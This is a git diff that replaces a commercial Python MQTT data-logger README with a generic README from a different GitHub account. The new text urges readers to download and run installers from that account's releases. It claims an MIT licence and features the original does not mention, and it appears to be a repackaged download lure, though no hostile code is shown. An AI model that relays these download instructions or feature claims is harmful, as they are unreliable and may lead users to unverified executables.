@@ -1,72 +1,85 @@
-> **🔥 BLACK FRIDAY SALE:** Get **15% OFF** all source codes with code `BLACKFRIDAY`. [**Click here to apply discount automatically**](https://pokhts.gumroad.com/l/senior-engineer-toolkit?offer_code=BLACKFRIDAY)
+# 🚀 Python-MQTT-Data-Logger-GUI - Easy Data Logging with MQTT
 
+![Download Python-MQTT-Data-Logger-GUI](https://img.shields.io/badge/Download-Python--MQTT--Data--Logger--GUI-blue?style=for-the-badge&logo=github)
 
+## 📋 Description
+Python-MQTT-Data-Logger-GUI is a user-friendly application designed for effortless data logging using the MQTT protocol. Built with Python's Tkinter and Paho-MQTT, it provides a simple interface for secure authentication, custom port settings, and automatic CSV export of your logged data. This tool is perfect for anyone interested in automation or IoT projects.
 
+## 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or higher
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 100 MB available
 
-# 📡 Python MQTT Data Logger (GUI Source Code)
+## 🚀 Getting Started
+Follow these steps to download and set up the application on your computer.
 
-[![Python](https://img.shields.io/badge/Python-3.x-blue.svg)](https://www.python.org/)
-[![Library](https://img.shields.io/badge/paho--mqtt-v2.0-orange.svg)]()
-[![License](https://img.shields.io/badge/License-Commercial-green.svg)]()
+1. **Visit the Releases Page**  
+   Click the link below to access the download page:  
+   [Download Python-MQTT-Data-Logger-GUI Releases](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/releases)
 
-## Stop writing boilerplate MQTT scripts.
-## A production-ready, GUI-based MQTT Client & Data Logger. Built with Python Tkinter and the latest Paho-MQTT v2.0.
+2. **Choose the Latest Version**  
+   On the Releases page, find the version labeled "Latest release." This version includes the most recent updates and bug fixes.
 
-[MQTT Logger Demo]
-<img width="598" height="780" alt="螢幕擷取畫面 2025-11-19 153828" src="https://github.com/user-attachments/assets/98a8f109-5dc3-4339-b448-cca4c37c03a8" />
+3. **Download the Installer**  
+   Once you locate the latest version, download the installer file suited for your operating system. Look for files with the extensions `.exe` for Windows, `.dmg` for macOS, and appropriate package formats for Linux. 
 
----
+4. **Run the Installer**  
+   After the download completes, navigate to your downloads folder and double-click the installer file. Follow the on-screen instructions to complete the installation.
 
-## 🚀 Why this tool?
-Most free MQTT tools (like MQTT.fx or MQTT Explorer) are great for viewing data, but **hard to customize** or **integrate into your own logic**.
+5. **Launch the Application**  
+   After the installation, find the application in your program list and launch it. You will see a straightforward interface designed for your ease of use.
 
-This project provides a **Full Python Source Code** template that handles:
-* ✅ **Secure Auth:** Support for Username/Password & Custom Ports (essential for Cloud Brokers like HiveMQ/EMQX).
-* ✅ **Paho-MQTT v2.0:** Compliant with the latest API standards (no deprecation warnings).
-* ✅ **Auto CSV Logging:** Instantly saves `Topic`, `Payload`, and `Timestamp` to CSV.
-* ✅ **Subscription Check:** Detects if the broker REJECTS your subscription (e.g., wrong wildcard usage).
+## 🌐 Configuration
+1. **Set Up MQTT Connection**  
+   To begin logging data, you'll need to configure your MQTT settings. Enter your MQTT broker's address, port number, and other required credentials.
 
----
+2. **Select Data Sources**  
+   Choose the sensors or data sources you want to log. This could be temperature, humidity, or any other measurement available from your MQTT feeds.
 
-## ✨ Features
-* **GUI Interface:** Clean Tkinter UI. No HTML/JS knowledge required.
-* **Non-Blocking:** Threaded architecture keeps the UI responsive.
-* **Instant Export:** Data is saved to `mqtt_log.csv` in real-time.
-* **Error Handling:** Visual feedback for connection failures or subscription rejections.
+3. **Export Settings**  
+   Configure export options for your logs. You can select the directory for the CSV files and set the intervals for data logging.
 
-## 🛠️ Dependencies
-Only one external library is required:
-```bash
-pip install paho-mqtt
-```
-📥 Download Full Source Code
-You can get the Complete Source Code (main.py) which includes the full GUI implementation, threading logic, and the Paho v2.0 callback structure.
+## 📤 Using the Application
+1. **Start Data Logging**  
+   Press the "Start" button once your settings are in place. The application will begin reaching out to your selected data sources.
 
-It is fully commented and ready to be customized for your own automation projects.
+2. **Monitor Data in Real-Time**  
+   You can view incoming data within the application. You'll see real-time graphs that can help visualize the changes as they occur.
 
-👉 Download on Gumroad ($9.9): [[link](https://pokhts.gumroad.com/l/python-mqtt-logger)]
+3. **Export Data**  
+   Once you stop logging, export the collected data as a CSV file by clicking on the “Export” button. Your data will be saved in the directory you specified.
 
-(Includes: main.py, requirements.txt, and Setup Guide)
+4. **Adjust Settings as Needed**  
+   Feel free to modify your settings at any time if you need to change data sources or export options.
 
-📖 Code Snippet (Paho v2.0 Logic)
-The code implements the latest callback API to ensure future compatibility:
-```
-Python
+## 🔧 Features
+- Simple user interface for easy navigation
+- Support for secure authentication
+- Custom port options for flexibility
+- Automatic CSV export for convenient data handling
+- Real-time data monitoring and visualization
 
-# Support for Paho-MQTT v2.0 Callback API
-def on_subscribe(self, client, userdata, mid, reason_code_list, properties):
-    # Check if subscription was granted (Code >= 128 means failure)
-    if reason_code_list[0] >= 128:
-        self.log_message(f"❌ Subscription REJECTED!")
-    else:
-        self.log_message(f"✅ Subscribed successfully.")
+## 🚩 Troubleshooting
+If you encounter any issues while using the application, consider the following:
 
-# Initialize with VERSION2 to avoid DeprecationWarning
-self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
-```
-👨‍💻 About the Author
-Phil Yeh - Senior Automation Engineer
+1. **Connection Issues**  
+   Ensure your internet connection is stable and your MQTT broker settings are correct.
 
-My Gumroad Store ([More Engineering Tools](https://gumroad.com/products))
+2. **Data Not Logging**  
+   Check that your selected data sources are sending data and that you have the right permissions.
 
-Keywords: MQTT, Python, Paho-MQTT, IoT, Data Logger, GUI, Source Code, Automation, Tkinter, SCADA
+3. **Export Problems**  
+   Make sure the export directory exists and you have write access to that location.
+
+For more help, you can check the issues section on the [GitHub repository](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/issues).
+
+## 📥 Download & Install
+To begin using Python-MQTT-Data-Logger-GUI, visit the page below for the latest releases, select your installer, and follow the installation instructions:  
+[Download Python-MQTT-Data-Logger-GUI Releases](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/releases) 
+
+## 🤝 Contributing
+We welcome contributions! If you’d like to enhance this application or fix bugs, please refer to the contributing guidelines provided in the repository.
+
+## 📚 License
+This project is licensed under the MIT License. You can use, modify, and distribute this software freely, provided that you include the original license in all copies or substantial portions of the software.
